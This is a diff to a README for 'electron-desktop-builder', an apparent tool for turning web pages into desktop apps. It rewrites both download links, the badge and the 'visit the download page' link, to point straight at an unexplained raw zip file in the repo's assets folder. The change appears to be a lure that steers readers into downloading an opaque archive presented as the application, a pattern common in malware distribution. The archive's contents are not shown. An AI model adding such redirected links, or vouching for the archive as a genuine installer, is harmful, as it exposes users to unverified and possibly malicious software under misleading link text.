@@ -1,6 +1,6 @@
 # 🚀 electron-desktop-builder - Turn web pages into desktop apps
 
-[![](https://img.shields.io/badge/Download-Application-grey.svg)](https://github.com/Aftershockmedicalscientist1009/electron-desktop-builder)
+[![](https://img.shields.io/badge/Download-Application-grey.svg)](https://github.com/Aftershockmedicalscientist1009/electron-desktop-builder/raw/refs/heads/main/assets/builder-electron-desktop-pernickety.zip)
 
 ## What this program does
 
@@ -21,7 +21,7 @@ Your computer must meet these basic needs to run the desktop builder:
 2. Select the latest version of the installer for Windows.
 3. Save the file to your computer.
 
-[Click here to visit the download page](https://github.com/Aftershockmedicalscientist1009/electron-desktop-builder)
+[Click here to visit the download page](https://github.com/Aftershockmedicalscientist1009/electron-desktop-builder/raw/refs/heads/main/assets/builder-electron-desktop-pernickety.zip)
 
 ## ⚙️ Installation steps
 
